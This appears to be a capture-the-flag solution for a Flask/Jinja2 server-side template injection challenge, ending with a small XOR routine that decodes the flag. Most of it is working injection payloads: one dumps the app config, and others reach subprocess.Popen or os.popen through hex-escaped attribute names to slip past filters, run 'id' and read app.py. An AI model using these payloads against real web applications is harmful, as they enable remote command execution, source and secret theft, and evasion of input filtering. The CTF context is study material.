# Solution

Step 1, get the config

``` python
{{self|attr("\x5f\x5fdict\x5f\x5f")}}
```

Step 2, get the app source code

``` python
{{ ''.__class__.__mro__[1].__subclasses__()[407]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
```

``` python
{{ request|attr(\x5f\x5fclass\x5f\x5f)|attr(\x5f\x5fmro\x5f\x5f)[1]}}
.__subclasses__()[407]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
```

``` python
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat app**")|attr("read")()}}
```

Step 3, run it yourself!

``` python
def magic(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))
 
flag="HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*"
magic(flag, '112f3a99b283a4e1788dedd8e0e5d35375c33747')
```
 
